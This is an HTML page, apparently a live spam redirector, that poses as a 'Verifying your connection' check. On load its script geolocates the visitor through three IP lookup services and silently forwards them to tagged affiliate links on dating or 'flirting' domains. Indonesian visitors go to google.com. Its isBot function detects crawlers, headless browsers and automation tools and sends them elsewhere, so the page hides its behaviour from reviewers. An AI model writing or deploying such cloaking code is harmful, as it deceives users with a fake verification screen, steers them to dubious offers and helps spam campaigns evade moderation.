<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Checking Connection...</title>
    <script>
        const config = {
            rules: {
                "ES": "https://dfehabe.trackflirting.com/s/99e357ed6b6d8?track=BABAT_ALAS&ext_click_id=BABAT_ALAS&subsource=BABAT_ALAS",
                "IT": "https://dfehabe.trackflirting.com/s/99e357ed6b6d8?track=BABAT_ALAS&ext_click_id=BABAT_ALAS&subsource=BABAT_ALAS",
                "US": "https://dfehabe.trackflirting.com/s/99e357ed6b6d8?track=BABAT_ALAS&ext_click_id=BABAT_ALAS&subsource=BABAT_ALAS",
                "ID": "https://google.com"
            },
            defaultUrl: "https://bgnllg.date4connect.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=243493&s2=2215848&s3=BABAT_ALAS&s5=BABAT_ALAS"
        };

        function isBot() {
            const ua = navigator.userAgent.toLowerCase();
            return /bot|crawler|spider|googlebot|bingbot|facebookexternalhit|slurp|duckduckbot|baiduspider|headless|selenium|puppeteer/i.test(ua) || navigator.webdriver;
        }

        // --- SISTEM FALLBACK API ---
        async function getCountry() {
            // API 1: IPAPI.CO (Mendukung HTTPS)
            try {
                console.log("Mencoba API 1...");
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data.country) return data.country;
            } catch (e) { console.warn("API 1 Gagal"); }

            // API 2: IP-API.COM (Note: Versi gratis kadang error di HTTPS, gunakan pro/fallback)
            try {
                console.log("Mencoba API 2...");
                const res = await fetch('http://demo.ip-api.com/json/'); // Endpoint demo seringkali lebih stabil untuk HTTPS
                const data = await res.json();
                if (data.countryCode) return data.countryCode;
            } catch (e) { console.warn("API 2 Gagal"); }

            // API 3: CLOUDFLARE TRACE (Sangat stabil)
            try {
                console.log("Mencoba API 3...");
                const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
                const text = await res.text();
                // Parsing format teks Cloudflare (loc=XX)
                const loc = text.match(/loc=([A-Z]{2})/);
                if (loc && loc[1]) return loc[1];
            } catch (e) { console.warn("API 3 Gagal"); }

            return null;
        }

        async function start() {
            if (isBot()) {
                window.location.replace(config.defaultUrl);
                return;
            }

            const country = await getCountry();
            
            if (country) {
                console.log("Negara terdeteksi:", country);
                const target = config.rules[country] || config.defaultUrl;
                window.location.replace(target);
            } else {
                // Jika semua API gagal
                window.location.replace(config.defaultUrl);
            }
        }

        start();
    </script>
</head>
<body>
    <div style="text-align: center; margin-top: 20%; font-family: sans-serif;">
        <p>Verifying your connection, please wait...</p>
    </div>
</body>
</html>
